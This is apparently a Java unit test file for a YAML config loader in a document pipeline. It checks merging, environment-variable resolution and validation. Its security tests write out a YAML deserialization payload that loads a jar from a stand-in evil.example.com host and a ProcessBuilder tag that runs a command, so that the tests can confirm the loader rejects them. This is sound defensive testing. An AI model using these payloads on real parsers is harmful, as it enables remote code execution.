package com.knowly.core.config;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.knowly.common.exception.ConfigException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Map;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

/**
 * {@link ConfigLoader} 单元测试。覆盖三层合并、环境变量解析、校验。
 */
class ConfigLoaderTest {

    @TempDir
    Path tempDir;

    @Test
    void should_load_defaults_when_no_user_config() {
        // 仅用内置默认 + 命令行覆盖 input/output
        PipelineConfig config = ConfigLoader.load(null, Map.of(
                "pipeline.input", "/data/docs",
                "pipeline.output", "/data/kb"));

        assertThat(config.name()).isNotBlank();
        assertThat(config.input()).isEqualTo("/data/docs");
        assertThat(config.output()).isEqualTo("/data/kb");
        assertThat(config.stages().clean().chunking().maxSize()).isEqualTo(500);
    }

    @Test
    void should_override_defaults_with_user_config(@TempDir Path configDir) throws Exception {
        Path configFile = configDir.resolve("pipeline.yaml");
        Files.writeString(configFile, """
                pipeline:
                  name: "测试流水线"
                  input: /test/input
                  output: /test/output
                  stages:
                    clean:
                      chunking:
                        max_size: 800
                        overlap: 100
                """);

        PipelineConfig config = ConfigLoader.load(configFile);

        assertThat(config.name()).isEqualTo("测试流水线");
        assertThat(config.stages().clean().chunking().maxSize()).isEqualTo(800);  // 覆盖默认 500
        assertThat(config.stages().clean().chunking().overlap()).isEqualTo(100);   // 覆盖默认 50
    }

    @Test
    void should_resolve_env_var_when_present() {
        // PATH 在绝大多数平台存在；若不存在则跳过此断言（不依赖特定环境）
        String path = System.getenv("PATH");
        org.junit.jupiter.api.Assumptions.assumeTrue(path != null && !path.isEmpty(),
                "PATH 环境变量不存在，跳过");

        String resolved = ConfigLoader.resolveString("env: ${PATH}");

        assertThat(resolved).doesNotContain("${PATH}");
    }

    @Test
    void should_use_default_when_env_var_missing_and_default_provided() {
        String resolved = ConfigLoader.resolveString("port: ${KNOWLY_NONEXISTENT:5433}");

        assertThat(resolved).contains("5433");
    }

    @Test
    void should_keep_placeholder_when_env_missing_and_no_default() {
        String resolved = ConfigLoader.resolveString("val: ${KNOWLY_DEFINITELY_MISSING}");

        assertThat(resolved).contains("${KNOWLY_DEFINITELY_MISSING}");
    }

    @Test
    void should_inherit_name_from_defaults_when_user_config_omits_it(@TempDir Path configDir) throws Exception {
        // 用户配置不写 name → 继承默认配置的 name
        Path configFile = configDir.resolve("ok.yaml");
        Files.writeString(configFile, """
                pipeline:
                  input: /test
                  output: /out
                """);

        PipelineConfig config = ConfigLoader.load(configFile);

        // 默认配置 knowly-defaults.yaml 里有 name，用户没覆盖 → 保留默认
        assertThat(config.name()).isNotBlank();
        assertThat(config.input()).isEqualTo("/test");
    }

    @Test
    void should_throw_when_max_size_invalid(@TempDir Path configDir) throws Exception {
        Path configFile = configDir.resolve("bad.yaml");
        Files.writeString(configFile, """
                pipeline:
                  name: "t"
                  stages:
                    clean:
                      chunking:
                        max_size: 0
                """);

        assertThatThrownBy(() -> ConfigLoader.load(configFile))
                .isInstanceOf(ConfigException.class)
                .hasMessageContaining("max_size");
    }

    @Test
    void should_throw_when_vector_sink_but_no_api_key(@TempDir Path configDir) throws Exception {
        Path configFile = configDir.resolve("bad.yaml");
        Files.writeString(configFile, """
                pipeline:
                  name: "t"
                  input: /in
                  output: /out
                  sinks:
                    - type: pgvector
                      password: ${PG_PASSWORD:test}
                """);

        // DASHSCOPE_API_KEY 未设置 → 校验失败
        assertThatThrownBy(() -> ConfigLoader.load(configFile))
                .isInstanceOf(ConfigException.class)
                .hasMessageContaining("API Key");
    }

    @Test
    void should_deep_merge_maps_recursively() {
        Map<String, Object> base = new java.util.LinkedHashMap<>();
        base.put("a", Map.of("x", 1, "y", 2));
        Map<String, Object> override = new java.util.LinkedHashMap<>();
        override.put("a", Map.of("y", 99, "z", 3));

        Map<String, Object> target = new java.util.LinkedHashMap<>();
        ConfigLoader.deepMerge(target, base);
        ConfigLoader.deepMerge(target, override);

        @SuppressWarnings("unchecked")
        Map<String, Object> a = (Map<String, Object>) target.get("a");
        assertThat(a.get("x")).isEqualTo(1);   // base 保留
        assertThat(a.get("y")).isEqualTo(99);  // override 覆盖
        assertThat(a.get("z")).isEqualTo(3);   // override 新增
    }

    // ── 安全测试 ──

    @Test
    void should_reject_yaml_deserialization_attack(@TempDir Path configDir) throws Exception {
        // 经典 YAML 反序列化攻击载荷：!!javax.script.ScriptEngineManager 试图实例化任意类。
        // SafeConstructor 必须拒绝此类标签，不得执行任意代码。
        Path configFile = configDir.resolve("evil.yaml");
        Files.writeString(configFile, """
                pipeline:
                  name: "test"
                  input: /in
                  output: /out
                attack: !!javax.script.ScriptEngineManager [
                  !!java.net.URLClassLoader [[
                    !!java.net.URL ["http://evil.example.com/payload.jar"]
                  ]]
                ]
                """);

        // SafeConstructor 遇到 !! 标签应抛异常（而非实例化任意类）
        assertThatThrownBy(() -> ConfigLoader.load(configFile))
                .isInstanceOf(Exception.class);
        // 关键：不抛 RuntimeException 之外的东西，不触发网络请求
    }

    @Test
    void should_reject_arbitrary_java_class_tag(@TempDir Path configDir) throws Exception {
        // 尝试构造任意 Java 对象
        Path configFile = configDir.resolve("evil2.yaml");
        Files.writeString(configFile, """
                pipeline:
                  name: "t"
                  cmd: !!java.lang.ProcessBuilder [["cmd", "/c", "calc"]]
                """);

        assertThatThrownBy(() -> ConfigLoader.load(configFile))
                .isInstanceOf(Exception.class);
    }

    @Test
    void should_not_leak_api_key_in_error_message(@TempDir Path configDir) throws Exception {
        // 配置含明文 API key（用户误填），校验报错时不应在消息里回显完整 key
        Path configFile = configDir.resolve("leak.yaml");
        Files.writeString(configFile, """
                pipeline:
                  name: "t"
                  stages:
                    embed:
                      api_key: sk-supersecretkey123456789
                  sinks:
                    - type: qdrant
                """);

        // 这个配置可能因 DASHSCOPE 解析或别的校验失败，但无论如何错误信息不应含完整明文 key
        try {
            ConfigLoader.load(configFile);
        } catch (Exception e) {
            String msg = e.getMessage() == null ? "" : e.getMessage();
            // 错误消息不应回显完整明文密钥（可含脱敏后的片段）
            assertThat(msg).doesNotContain("sk-supersecretkey123456789");
        }
    }
}
